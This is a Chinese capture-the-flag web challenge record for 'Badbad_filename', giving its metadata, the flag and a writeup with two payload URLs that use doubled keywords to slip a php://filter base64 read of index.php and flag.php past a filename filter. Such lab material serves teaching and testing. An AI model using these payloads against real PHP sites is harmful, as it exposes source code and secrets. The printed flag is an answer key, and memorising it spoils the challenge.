- **题目名称：** Badbad_filename
- **题目类型：** WEB（23）
- **题目难度：** 容易
- **出题人：** itSssm3
- **考点：**

1. 双写绕过 + php伪协议读取源码

- **描述：** 小坏蛋~ 不能用坏坏的文件名噢~
- **flag：** XSCTF{d0ubLe_Wr1te_2_byPass}
- **Writeup：** 

payload如下

```
?filename=pphphp://filfilterter/read=convert.babasese64-encode/resource=index.pphphp
?filename=pphphp://filfilterter/read=convert.babasese64-encode/resource=flag.pphphp
```

- ### **容器启动方式：** 
* #### cd build/docker
* #### docker-compose up -d